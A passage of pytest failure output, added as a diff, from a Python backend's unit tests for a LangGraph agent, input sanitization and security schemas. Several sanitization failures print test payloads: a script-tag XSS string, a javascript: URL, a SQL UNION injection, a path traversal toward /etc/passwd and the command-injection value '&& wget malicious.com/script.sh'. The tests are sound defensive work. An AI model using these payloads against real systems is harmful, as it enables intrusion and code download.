+                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+../.local/lib/python3.12/site-packages/pydantic/main.py:1044: in _setattr_handler
+    raise ValueError(f'"{cls.__name__}" object has no field "{name}"')
+E   ValueError: "RunnableBinding" object has no field "ainvoke"
+
+During handling of the above exception, another exception occurred:
+../.local/lib/python3.12/site-packages/pydantic/main.py:1084: in __delattr__
+    object.__delattr__(self, item)
+E   AttributeError: 'RunnableBinding' object has no attribute 'ainvoke'
+
+During handling of the above exception, another exception occurred:
+tests/unit/test_langgraph_graph.py:133: in test_chat_with_token_usage
+    with patch.object(agent.llm, 'ainvoke', return_value=mock_llm_response):
+/usr/lib/python3.12/unittest/mock.py:1580: in __enter__
+    if not self.__exit__(*sys.exc_info()):
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/usr/lib/python3.12/unittest/mock.py:1588: in __exit__
+    delattr(self.target, self.attribute)
+../.local/lib/python3.12/site-packages/pydantic/main.py:1086: in __delattr__
+    raise AttributeError(f'{type(self).__name__!r} object has no attribute {item!r}')
+E   AttributeError: 'RunnableBinding' object has no attribute 'ainvoke'
+_________________ TestLangGraphAgent.test_chat_llm_error_retry _________________
+/usr/lib/python3.12/unittest/mock.py:1567: in __enter__
+    setattr(self.target, self.attribute, new_attr)
+../.local/lib/python3.12/site-packages/pydantic/main.py:997: in __setattr__
+    elif (setattr_handler := self._setattr_handler(name, value)) is not None:
+                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+../.local/lib/python3.12/site-packages/pydantic/main.py:1044: in _setattr_handler
+    raise ValueError(f'"{cls.__name__}" object has no field "{name}"')
+E   ValueError: "RunnableBinding" object has no field "ainvoke"
+
+During handling of the above exception, another exception occurred:
+../.local/lib/python3.12/site-packages/pydantic/main.py:1084: in __delattr__
+    object.__delattr__(self, item)
+E   AttributeError: 'RunnableBinding' object has no attribute 'ainvoke'
+
+During handling of the above exception, another exception occurred:
+tests/unit/test_langgraph_graph.py:153: in test_chat_llm_error_retry
+    with patch.object(agent.llm, 'ainvoke') as mock_invoke:
+/usr/lib/python3.12/unittest/mock.py:1580: in __enter__
+    if not self.__exit__(*sys.exc_info()):
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/usr/lib/python3.12/unittest/mock.py:1588: in __exit__
+    delattr(self.target, self.attribute)
+../.local/lib/python3.12/site-packages/pydantic/main.py:1086: in __delattr__
+    raise AttributeError(f'{type(self).__name__!r} object has no attribute {item!r}')
+E   AttributeError: 'RunnableBinding' object has no attribute 'ainvoke'
+______________ TestLangGraphAgent.test_chat_max_retries_exceeded _______________
+/usr/lib/python3.12/unittest/mock.py:1567: in __enter__
+    setattr(self.target, self.attribute, new_attr)
+../.local/lib/python3.12/site-packages/pydantic/main.py:997: in __setattr__
+    elif (setattr_handler := self._setattr_handler(name, value)) is not None:
+                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+../.local/lib/python3.12/site-packages/pydantic/main.py:1044: in _setattr_handler
+    raise ValueError(f'"{cls.__name__}" object has no field "{name}"')
+E   ValueError: "RunnableBinding" object has no field "ainvoke"
+
+During handling of the above exception, another exception occurred:
+../.local/lib/python3.12/site-packages/pydantic/main.py:1084: in __delattr__
+    object.__delattr__(self, item)
+E   AttributeError: 'RunnableBinding' object has no attribute 'ainvoke'
+
+During handling of the above exception, another exception occurred:
+tests/unit/test_langgraph_graph.py:172: in test_chat_max_retries_exceeded
+    with patch.object(agent.llm, 'ainvoke') as mock_invoke:
+/usr/lib/python3.12/unittest/mock.py:1580: in __enter__
+    if not self.__exit__(*sys.exc_info()):
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/usr/lib/python3.12/unittest/mock.py:1588: in __exit__
+    delattr(self.target, self.attribute)
+../.local/lib/python3.12/site-packages/pydantic/main.py:1086: in __delattr__
+    raise AttributeError(f'{type(self).__name__!r} object has no attribute {item!r}')
+E   AttributeError: 'RunnableBinding' object has no attribute 'ainvoke'
+_______________ TestLangGraphAgent.test_tool_call_tool_not_found _______________
+tests/unit/test_langgraph_graph.py:242: in test_tool_call_tool_not_found
+    with pytest.raises(ToolExecutionException):
+E   Failed: DID NOT RAISE <class 'app.core.exceptions.ToolExecutionException'>
+------------------------------ Captured log call -------------------------------
+ERROR    app.core.logging:graph.py:300 [2m2025-07-05T17:04:26.085074Z[0m [[31m[1merror    [0m] [1mtool_not_found                [0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mgraph.py[0m [36mfunc_name[0m=[35m_tool_call[0m [36mlineno[0m=[35m300[0m [36mmodule[0m=[35mgraph[0m [36moperation_id[0m=[35m0f2b4180-adca-44fc-86e0-5a72ee96bc9e[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/langgraph/graph.py[0m [36mtool_name[0m=[35munknown_tool[0m
+WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T17:04:26.085224Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m"Tool execution failed for 'unknown_tool': Tool 'unknown_tool' not found"[0m [36merror_type[0m=[35mtool_execution_error[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/tool/unknown_tool[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
+ERROR    app.core.logging:graph.py:347 [2m2025-07-05T17:04:26.085308Z[0m [[31m[1merror    [0m] [1mtool_execution_failed         [0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36merror[0m=[35m"Tool 'unknown_tool' not found"[0m [36mfilename[0m=[35mgraph.py[0m [36mfunc_name[0m=[35m_tool_call[0m [36mlineno[0m=[35m347[0m [36mmodule[0m=[35mgraph[0m [36moperation_id[0m=[35m0f2b4180-adca-44fc-86e0-5a72ee96bc9e[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/langgraph/graph.py[0m [36mtool_name[0m=[35munknown_tool[0m
+Traceback (most recent call last):
+  File "/home/paul/boardroom-repo/app/core/langgraph/graph.py", line 301, in _tool_call
+    raise_tool_execution_error(error_msg, tool_name)
+  File "/home/paul/boardroom-repo/app/core/exceptions.py", line 385, in raise_tool_execution_error
+    raise ToolExecutionException(message=message, tool_name=tool_name)
+app.core.exceptions.ToolExecutionException: Tool 'unknown_tool' not found
+_________________ TestLangGraphAgent.test_create_graph_success _________________
+tests/unit/test_langgraph_graph.py:314: in test_create_graph_success
+    graph = await agent.create_graph()
+            ^^^^^^^^^^^^^^^^^^^^^^^^^^
+app/core/langgraph/graph.py:434: in create_graph
+    raise e
+app/core/langgraph/graph.py:411: in create_graph
+    await checkpointer.setup()
+../.local/lib/python3.12/site-packages/langgraph/checkpoint/postgres/aio.py:84: in setup
+    async with self._cursor() as cur:
+/usr/lib/python3.12/contextlib.py:210: in __aenter__
+    return await anext(self.gen)
+           ^^^^^^^^^^^^^^^^^^^^^
+../.local/lib/python3.12/site-packages/langgraph/checkpoint/postgres/aio.py:351: in _cursor
+    async with _ainternal.get_connection(self.conn) as conn:
+/usr/lib/python3.12/contextlib.py:210: in __aenter__
+    return await anext(self.gen)
+           ^^^^^^^^^^^^^^^^^^^^^
+../.local/lib/python3.12/site-packages/langgraph/checkpoint/postgres/_ainternal.py:24: in get_connection
+    raise TypeError(f"Invalid connection type: {type(conn)}")
+E   TypeError: Invalid connection type: <class 'unittest.mock.AsyncMock'>
+------------------------------ Captured log call -------------------------------
+ERROR    app.core.logging:graph.py:429 [2m2025-07-05T17:04:26.219218Z[0m [[31m[1merror    [0m] [1mgraph_creation_failed         [0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36merror[0m=[35m"Invalid connection type: <class 'unittest.mock.AsyncMock'>"[0m [36mfilename[0m=[35mgraph.py[0m [36mfunc_name[0m=[35mcreate_graph[0m [36mlineno[0m=[35m429[0m [36mmodule[0m=[35mgraph[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/langgraph/graph.py[0m
+_____________ TestLangGraphAgent.test_create_graph_no_checkpointer _____________
+tests/unit/test_langgraph_graph.py:331: in test_create_graph_no_checkpointer
+    graph = await agent.create_graph()
+            ^^^^^^^^^^^^^^^^^^^^^^^^^^
+app/core/langgraph/graph.py:434: in create_graph
+    raise e
+app/core/langgraph/graph.py:416: in create_graph
+    raise Exception("Connection pool initialization failed")
+E   Exception: Connection pool initialization failed
+------------------------------ Captured log call -------------------------------
+ERROR    app.core.logging:graph.py:429 [2m2025-07-05T17:04:26.258021Z[0m [[31m[1merror    [0m] [1mgraph_creation_failed         [0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36merror[0m=[35m'Connection pool initialization failed'[0m [36mfilename[0m=[35mgraph.py[0m [36mfunc_name[0m=[35mcreate_graph[0m [36mlineno[0m=[35m429[0m [36mmodule[0m=[35mgraph[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/langgraph/graph.py[0m
+_________________ TestLangGraphAgent.test_get_response_success _________________
+tests/unit/test_langgraph_graph.py:354: in test_get_response_success
+    result = await agent.get_response(messages, session_id)
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+app/core/langgraph/graph.py:459: in get_response
+    CallbackHandler(
+E   TypeError: LangchainCallbackHandler.__init__() got an unexpected keyword argument 'environment'
+_________________ TestLangGraphAgent.test_get_stream_response __________________
+tests/unit/test_langgraph_graph.py:379: in test_get_stream_response
+    async for token in agent.get_stream_response(messages, session_id):
+app/core/langgraph/graph.py:492: in get_stream_response
+    CallbackHandler(
+E   TypeError: LangchainCallbackHandler.__init__() got an unexpected keyword argument 'environment'
+___________________ TestLangGraphAgent.test_get_chat_history ___________________
+tests/unit/test_langgraph_graph.py:405: in test_get_chat_history
+    result = await agent.get_chat_history(session_id)
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+app/core/langgraph/graph.py:526: in get_chat_history
+    state: StateSnapshot = await sync_to_async(self._graph.get_state)(
+E   TypeError: object Mock can't be used in 'await' expression
+__________________ TestLangGraphAgent.test_clear_chat_history __________________
+tests/unit/test_langgraph_graph.py:420: in test_clear_chat_history
+    await agent.clear_chat_history(session_id)
+app/core/langgraph/graph.py:554: in clear_chat_history
+    async with conn_pool.connection() as conn:
+E   TypeError: 'coroutine' object does not support the asynchronous context manager protocol
+------------------------------ Captured log call -------------------------------
+ERROR    app.core.logging:graph.py:564 [2m2025-07-05T17:04:26.340441Z[0m [[31m[1merror    [0m] [1mFailed to clear chat history  [0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36merror[0m=[35m"'coroutine' object does not support the asynchronous context manager protocol"[0m [36mfilename[0m=[35mgraph.py[0m [36mfunc_name[0m=[35mclear_chat_history[0m [36mlineno[0m=[35m564[0m [36mmodule[0m=[35mgraph[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/langgraph/graph.py[0m
+_________ TestCreateMeetingAgendaTool.test_time_allocation_calculation _________
+tests/unit/test_meeting_management_tools.py:120: in test_time_allocation_calculation
+    assert total_time == 30
+E   assert 27.0 == 30
+__________ TestSanitizeString.test_sanitize_string_remove_script_tags __________
+tests/unit/test_sanitization.py:47: in test_sanitize_string_remove_script_tags
+    assert "script" not in result.lower()
+E   AssertionError: assert 'script' not in '&lt;script&...ipt&gt;hello'
+E     
+E     'script' is contained here:
+E       &lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;hello
+E     ?     ++++++
+__________ TestSanitizeString.test_sanitize_string_remove_null_bytes ___________
+tests/unit/test_sanitization.py:53: in test_sanitize_string_remove_null_bytes
+    assert result == "Hello World"
+E   AssertionError: assert 'HelloWorld' == 'Hello World'
+E     
+E     - Hello World
+E     ?      -
+E     + HelloWorld
+_____________ TestSanitizeEmail.test_sanitize_email_invalid_format _____________
+tests/unit/test_sanitization.py:101: in test_sanitize_email_invalid_format
+    with pytest.raises(ValueError, match="Invalid email format"):
+E   Failed: DID NOT RAISE <class 'ValueError'>
+__________ TestSanitizeFilename.test_sanitize_filename_path_traversal __________
+tests/unit/test_sanitization.py:247: in test_sanitize_filename_path_traversal
+    assert result == "etcpasswd"
+E   AssertionError: assert '......etcpasswd' == 'etcpasswd'
+E     
+E     - etcpasswd
+E     + ......etcpasswd
+E     ? ++++++
+_______ TestSanitizeSqlLikePattern.test_sanitize_sql_like_pattern_normal _______
+tests/unit/test_sanitization.py:271: in test_sanitize_sql_like_pattern_normal
+    assert result == "search_term"
+E   AssertionError: assert 'search\\_term' == 'search_term'
+E     
+E     - search_term
+E     + search\_term
+E     ?       +
+_____________ TestSanitizeUrl.test_sanitize_url_dangerous_schemes ______________
+tests/unit/test_sanitization.py:443: in test_sanitize_url_dangerous_schemes
+    sanitize_url(url)
+app/utils/sanitization.py:277: in sanitize_url
+    raise ValueError(f"URL scheme must be one of: {', '.join(allowed_schemes)}")
+E   ValueError: URL scheme must be one of: http, https, ftp, ftps
+
+During handling of the above exception, another exception occurred:
+tests/unit/test_sanitization.py:442: in test_sanitize_url_dangerous_schemes
+    with pytest.raises(ValueError, match="dangerous protocol"):
+E   AssertionError: Regex pattern did not match.
+E    Regex: 'dangerous protocol'
+E    Input: 'URL scheme must be one of: http, https, ftp, ftps'
+_________________ TestSanitizeUrl.test_sanitize_url_malformed __________________
+tests/unit/test_sanitization.py:453: in test_sanitize_url_malformed
+    sanitize_url("not a url")
+app/utils/sanitization.py:277: in sanitize_url
+    raise ValueError(f"URL scheme must be one of: {', '.join(allowed_schemes)}")
+E   ValueError: URL scheme must be one of: http, https, ftp, ftps
+
+During handling of the above exception, another exception occurred:
+tests/unit/test_sanitization.py:452: in test_sanitize_url_malformed
+    with pytest.raises(ValueError, match="Invalid URL format"):
+E   AssertionError: Regex pattern did not match.
+E    Regex: 'Invalid URL format'
+E    Input: 'URL scheme must be one of: http, https, ftp, ftps'
+_____ TestSanitizationEdgeCases.test_sanitize_string_advanced_xss_attempts _____
+tests/unit/test_sanitization.py:580: in test_sanitize_string_advanced_xss_attempts
+    assert "javascript:" not in result.lower()
+E   AssertionError: assert 'javascript:' not in 'javascript:...7;xss&#x27;)'
+E     
+E     'javascript:' is contained here:
+E       javascript:alert(&#x27;xss&#x27;)
+E     ? +++++++++++
+____ TestSanitizationEdgeCases.test_sanitize_string_sql_injection_attempts _____
+tests/unit/test_sanitization.py:599: in test_sanitize_string_sql_injection_attempts
+    assert "'" in result or "&#x27;" in result
+E   assert ("'" in 'UNION SELECT password FROM users' or '&#x27;' in 'UNION SELECT password FROM users')
+__ TestSanitizationEdgeCases.test_sanitize_string_command_injection_attempts ___
+tests/unit/test_sanitization.py:618: in test_sanitize_string_command_injection_attempts
+    assert "&lt;" in result or "&gt;" in result or result == payload
+E   AssertionError: assert ('&lt;' in '&amp;&amp; wget malicious.com/script.sh' or '&gt;' in '&amp;&amp; wget malicious.com/script.sh' or '&amp;&amp; w...com/script.sh' == '&& wget mali...com/script.sh'
+E     
+E     - && wget malicious.com/script.sh
+E     + &amp;&amp; wget malicious.com/script.sh
+E     ?  ++++ ++++)
+_____ TestSanitizationEdgeCases.test_sanitize_string_empty_and_whitespace ______
+tests/unit/test_sanitization.py:670: in test_sanitize_string_empty_and_whitespace
+    assert result == html.escape(input_str)
+                     ^^^^
+E   NameError: name 'html' is not defined. Did you forget to import 'html'
+_______ TestSanitizationEdgeCases.test_sanitize_dict_deep_nesting_attack _______
+tests/unit/test_sanitization.py:717: in test_sanitize_dict_deep_nesting_attack
+    assert "&lt;script&gt;" in current_result["malicious"]
+                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+E   KeyError: 'malicious'
+___ TestSanitizationEdgeCases.test_sanitize_filename_path_traversal_variants ___
+tests/unit/test_sanitization.py:746: in test_sanitize_filename_path_traversal_variants
+    assert ".." not in result
+E   AssertionError: assert '..' not in '......etcpasswd'
+E     
+E     '..' is contained here:
+E       ......etcpasswd
+E     ? ++
+___ TestSanitizationEdgeCases.test_validate_password_strength_comprehensive ____
+tests/unit/test_sanitization.py:793: in test_validate_password_strength_comprehensive
+    assert validate_password_strength(password) is True
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+app/utils/sanitization.py:115: in validate_password_strength
+    raise ValueError("Password must be at least 8 characters long")
+E   ValueError: Password must be at least 8 characters long
+____ TestSanitizationEdgeCases.test_validate_uuid_string_format_variations _____
+tests/unit/test_sanitization.py:828: in test_validate_uuid_string_format_variations
+    with pytest.raises(ValueError):
+E   Failed: DID NOT RAISE <class 'ValueError'>
+______ TestSanitizationEdgeCases.test_sanitize_url_comprehensive_attacks _______
+tests/unit/test_sanitization.py:899: in test_sanitize_url_comprehensive_attacks
+    sanitize_url(url)
+app/utils/sanitization.py:277: in sanitize_url
+    raise ValueError(f"URL scheme must be one of: {', '.join(allowed_schemes)}")
+E   ValueError: URL scheme must be one of: http, https, ftp, ftps
+
+During handling of the above exception, another exception occurred:
+tests/unit/test_sanitization.py:898: in test_sanitize_url_comprehensive_attacks
+    with pytest.raises(ValueError, match="dangerous protocol|Invalid URL format"):
+E   AssertionError: Regex pattern did not match.
+E    Regex: 'dangerous protocol|Invalid URL format'
+E    Input: 'URL scheme must be one of: http, https, ftp, ftps'
+______________ TestRotationPolicy.test_rotation_policy_edge_cases ______________
+tests/unit/test_security_schemas.py:113: in test_rotation_policy_edge_cases
+    policy = RotationPolicy(interval_days=1, warning_days=1, max_age_days=1)
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+E   pydantic_core._pydantic_core.ValidationError: 1 validation error for RotationPolicy
+E   warning_days
+E     Value error, warning_days must be less than interval_days [type=value_error, input_value=1, input_type=int]
+E       For further information visit https://errors.pydantic.dev/2.11/v/value_error
+_______________ TestWorkflowModule.test_workflow_initialization ________________
+tests/unit/test_workflow.py:426: in test_workflow_initialization
+    mock_create_workflow.assert_called_once()
+/usr/lib/python3.12/unittest/mock.py:923: in assert_called_once
+    raise AssertionError(msg)
+E   AssertionError: Expected 'create_boardroom_workflow' to have been called once. Called 0 times.
+=============================== warnings summary ===============================
+app/schemas/security.py:45
+  /home/paul/boardroom-repo/app/schemas/security.py:45: PydanticDeprecatedSince20: Pydantic V1 style `@validator` validators are deprecated. You should migrate to Pydantic V2 style `@field_validator` validators, see the migration guide for more details. Deprecated in Pydantic V2.0 to be removed in V3.0. See Pydantic V2 Migration Guide at https://errors.pydantic.dev/2.11/migration/
+    @validator('warning_days')
+
+../.local/lib/python3.12/site-packages/pydantic/_internal/_config.py:323
+../.local/lib/python3.12/site-packages/pydantic/_internal/_config.py:323
+../.local/lib/python3.12/site-packages/pydantic/_internal/_config.py:323
+../.local/lib/python3.12/site-packages/pydantic/_internal/_config.py:323
+  /home/paul/.local/lib/python3.12/site-packages/pydantic/_internal/_config.py:323: PydanticDeprecatedSince20: Support for class-based `config` is deprecated, use ConfigDict instead. Deprecated in Pydantic V2.0 to be removed in V3.0. See Pydantic V2 Migration Guide at https://errors.pydantic.dev/2.11/migration/
+    warnings.warn(DEPRECATION_MESSAGE, DeprecationWarning)
+
+../.local/lib/python3.12/site-packages/pydantic/main.py:253: 8 warnings
+tests/unit/test_security_schemas.py: 56 warnings
+  /home/paul/.local/lib/python3.12/site-packages/pydantic/main.py:253: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+    validated_self = self.__pydantic_validator__.validate_python(data, self_instance=self)
+
+tests/unit/test_ai_state_manager.py::TestAIStateManager::test_state_manager_initialization
+  tests/unit/test_ai_state_manager.py:46: PytestWarning: The test <Function test_state_manager_initialization> is marked with '@pytest.mark.asyncio' but it is not an async function. Please remove the asyncio mark. If the test is not marked explicitly, check for global marks applied via 'pytestmark'.
+    def test_state_manager_initialization(self, state_manager):
+
+tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_success
+tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_test_environment
+tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_with_retries
+tests/unit/test_database_service.py::TestDatabaseServiceConfigurationVariants::test_debug_mode_configuration
+tests/unit/test_database_service.py::TestDatabaseServiceConfigurationVariants::test_production_mode_configuration
+  /home/paul/boardroom-repo/app/services/database.py:100: RuntimeWarning: coroutine 'AsyncMockMixin._execute_mock_call' was never awaited
+    async with self._engine.begin() as conn:
+  Enable tracemalloc to get traceback where the object was allocated.
+  See https://docs.pytest.org/en/stable/how-to/capture-warnings.html#resource-warnings for more info.
+
+tests/unit/test_database_service.py::TestDatabaseServiceUserOperations::test_create_user_success
+tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_create_user_with_duplicate_email
+  /home/paul/boardroom-repo/app/services/database.py:212: RuntimeWarning: coroutine 'AsyncMockMixin._execute_mock_call' was never awaited
+    session.add(user)
+  Enable tracemalloc to get traceback where the object was allocated.
+  See https://docs.pytest.org/en/stable/how-to/capture-warnings.html#resource-warnings for more info.
+
+tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_database_transaction_rollback
+  /home/paul/boardroom-repo/tests/unit/test_database_service.py:747: RuntimeWarning: coroutine 'AsyncMockMixin._execute_mock_call' was never awaited
+    session.add(mock_user)
+  Enable tracemalloc to get traceback where the object was allocated.
+  See https://docs.pytest.org/en/stable/how-to/capture-warnings.html#resource-warnings for more info.
+
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_agent_initialization
+  tests/unit/test_langgraph_graph.py:59: PytestWarning: The test <Function test_agent_initialization> is marked with '@pytest.mark.asyncio' but it is not an async function. Please remove the asyncio mark. If the test is not marked explicitly, check for global marks applied via 'pytestmark'.
+    def test_agent_initialization(self, agent):
+
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_model_kwargs_development
+  tests/unit/test_langgraph_graph.py:66: PytestWarning: The test <Function test_get_model_kwargs_development> is marked with '@pytest.mark.asyncio' but it is not an async function. Please remove the asyncio mark. If the test is not marked explicitly, check for global marks applied via 'pytestmark'.
+    @patch('app.core.langgraph.graph.settings')
+
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_model_kwargs_production
+  tests/unit/test_langgraph_graph.py:78: PytestWarning: The test <Function test_get_model_kwargs_production> is marked with '@pytest.mark.asyncio' but it is not an async function. Please remove the asyncio mark. If the test is not marked explicitly, check for global marks applied via 'pytestmark'.
+    @patch('app.core.langgraph.graph.settings')
+
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_tool_call_tool_not_found
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_tool_call_execution_error
+tests/unit/test_workflow.py::TestRunBoardroomWorkflow::test_run_boardroom_workflow_state_creation_error
+tests/unit/test_workflow.py::TestRunBoardroomWorkflow::test_run_boardroom_workflow_execution_error
+tests/unit/test_workflow.py::TestWorkflowErrorHandling::test_network_error_handling
+tests/unit/test_workflow.py::TestWorkflowErrorHandling::test_timeout_error_handling
+tests/unit/test_workflow.py::TestWorkflowErrorHandling::test_validation_error_handling
+tests/unit/test_workflow.py::TestWorkflowErrorHandling::test_generic_exception_handling
+  /home/paul/.local/lib/python3.12/site-packages/structlog/_base.py:173: UserWarning: Remove `format_exc_info` from your processor chain if you want pretty exceptions.
+    event_dict = proc(self._logger, method_name, event_dict)
+
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_should_continue_no_tool_calls
+  tests/unit/test_langgraph_graph.py:274: PytestWarning: The test <Function test_should_continue_no_tool_calls> is marked with '@pytest.mark.asyncio' but it is not an async function. Please remove the asyncio mark. If the test is not marked explicitly, check for global marks applied via 'pytestmark'.
+    def test_should_continue_no_tool_calls(self, agent, sample_graph_state):
+
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_should_continue_with_tool_calls
+  tests/unit/test_langgraph_graph.py:288: PytestWarning: The test <Function test_should_continue_with_tool_calls> is marked with '@pytest.mark.asyncio' but it is not an async function. Please remove the asyncio mark. If the test is not marked explicitly, check for global marks applied via 'pytestmark'.
+    def test_should_continue_with_tool_calls(self, agent):
+
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_clear_chat_history
+  /home/paul/boardroom-repo/app/core/langgraph/graph.py:554: RuntimeWarning: coroutine 'AsyncMockMixin._execute_mock_call' was never awaited
+    async with conn_pool.connection() as conn:
+  Enable tracemalloc to get traceback where the object was allocated.
+  See https://docs.pytest.org/en/stable/how-to/capture-warnings.html#resource-warnings for more info.
+
+tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_process_messages
+  tests/unit/test_langgraph_graph.py:425: PytestWarning: The test <Function test_process_messages> is marked with '@pytest.mark.asyncio' but it is not an async function. Please remove the asyncio mark. If the test is not marked explicitly, check for global marks applied via 'pytestmark'.
+    def test_process_messages(self, agent):
+
+tests/unit/test_security_schemas.py::TestSecretMetadata::test_secret_metadata_custom_values
+  /home/paul/boardroom-repo/tests/unit/test_security_schemas.py:209: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+    expires_at = datetime.utcnow() + timedelta(days=30)
+
+tests/unit/test_security_schemas.py::TestSecretMetadata::test_secret_metadata_custom_values
+  /home/paul/boardroom-repo/tests/unit/test_security_schemas.py:210: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+    last_accessed = datetime.utcnow() - timedelta(hours=1)
+
+tests/unit/test_security_schemas.py::TestStoredSecret::test_stored_secret_with_backup_info
+  /home/paul/boardroom-repo/tests/unit/test_security_schemas.py:340: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+    last_backup = datetime.utcnow() - timedelta(hours=1)
+
+tests/unit/test_security_schemas.py::TestSecurityViolation::test_security_violation_with_details
+  /home/paul/boardroom-repo/tests/unit/test_security_schemas.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+    resolved_at = datetime.utcnow()
+
+tests/unit/test_security_schemas.py::TestSecurityScanResult::test_security_scan_result_with_violations
+  /home/paul/boardroom-repo/tests/unit/test_security_schemas.py:498: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+    completed_at = datetime.utcnow()
+
+tests/unit/test_security_schemas.py::TestSecretResponse::test_secret_response_creation
+  /home/paul/boardroom-repo/tests/unit/test_security_schemas.py:772: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+    created_at = datetime.utcnow()
+
+tests/unit/test_security_schemas.py::TestSecretResponse::test_secret_response_optional_fields
+  /home/paul/boardroom-repo/tests/unit/test_security_schemas.py:802: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+    created_at = datetime.utcnow()
+
+tests/unit/test_security_schemas.py::TestHealthCheck::test_health_check_with_issues
+  /home/paul/boardroom-repo/tests/unit/test_security_schemas.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+    last_scan = datetime.utcnow() - timedelta(hours=1)
+
+tests/unit/test_workflow.py::TestCallLLM::test_call_llm_missing_env_vars
+  /home/paul/boardroom-repo/app/utils/workflow.py:30: RuntimeWarning: coroutine 'AsyncMockMixin._execute_mock_call' was never awaited
+    response.raise_for_status()
+  Enable tracemalloc to get traceback where the object was allocated.
+  See https://docs.pytest.org/en/stable/how-to/capture-warnings.html#resource-warnings for more info.
+
+tests/unit/test_workflow.py::TestCallLLM::test_call_llm_missing_env_vars
+  /home/paul/boardroom-repo/app/utils/workflow.py:31: RuntimeWarning: coroutine 'AsyncMockMixin._execute_mock_call' was never awaited
+    return response.json()["choices"][0]["message"]["content"]
+  Enable tracemalloc to get traceback where the object was allocated.
+  See https://docs.pytest.org/en/stable/how-to/capture-warnings.html#resource-warnings for more info.
+
+-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
+- generated xml file: /home/paul/boardroom-repo/test-results/backend-unit.xml --
+=========================== short test summary info ============================
+FAILED tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_success
+FAILED tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_test_environment
+FAILED tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_with_retries
+FAILED tests/unit/test_database_service.py::TestDatabaseServiceSessionManagement::test_get_session_initializes_if_needed
+FAILED tests/unit/test_database_service.py::TestDatabaseServiceSessionManagement::test_get_session_operational_error_handling
